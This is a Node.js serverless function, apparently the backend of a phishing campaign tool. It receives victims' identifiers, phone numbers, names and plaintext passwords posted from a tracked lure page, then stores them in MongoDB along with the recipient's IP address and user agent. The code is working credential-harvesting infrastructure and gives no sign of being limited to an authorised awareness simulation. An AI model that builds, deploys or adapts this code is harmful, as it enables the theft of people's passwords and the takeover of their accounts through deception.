const mongoose = require('mongoose');

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI;

let isConnected = false;

async function connectToDatabase() {
  if (isConnected) {
    return;
  }
  
  try {
    await mongoose.connect(MONGODB_URI, {
      serverSelectionTimeoutMS: 5000,
    });
    isConnected = true;
    console.log('MongoDB Connected');
  } catch (error) {
    console.error('MongoDB Connection Error:', error);
    throw error;
  }
}

// Simple schema for captured credentials
const capturedCredentialSchema = new mongoose.Schema({
  campaignId: mongoose.Schema.Types.ObjectId,
  campaignTitle: String,
  recipientEmail: String,
  recipientName: String,
  trackingToken: String,
  identifier: String,
  mobile: String,
  countryCode: String,
  name: String,
  password: String,
  ipAddress: String,
  userAgent: String,
  capturedAt: { type: Date, default: Date.now }
});

const CapturedCredential = mongoose.model('CapturedCredential', capturedCredentialSchema);

exports.handler = async (event, context) => {
  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    // Parse request body
    const { token, identifier, mobile, countryCode, name, password } = JSON.parse(event.body);

    if (!token) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Token is required' })
      };
    }

    // Connect to MongoDB
    await connectToDatabase();

    // Extract IP address
    const ipAddress = event.headers['client-ip'] || 
                     event.headers['x-forwarded-for'] || 
                     event.headers['x-real-ip'] || 
                     'Unknown';

    const userAgent = event.headers['user-agent'] || 'Unknown';

    // Save credential to MongoDB
    await CapturedCredential.create({
      trackingToken: token,
      identifier,
      mobile,
      countryCode,
      name,
      password,
      ipAddress,
      userAgent,
      capturedAt: new Date()
    });

    console.log('Credential saved successfully for:', identifier);

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true, message: 'Credentials captured successfully' })
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message })
    };
  }
};
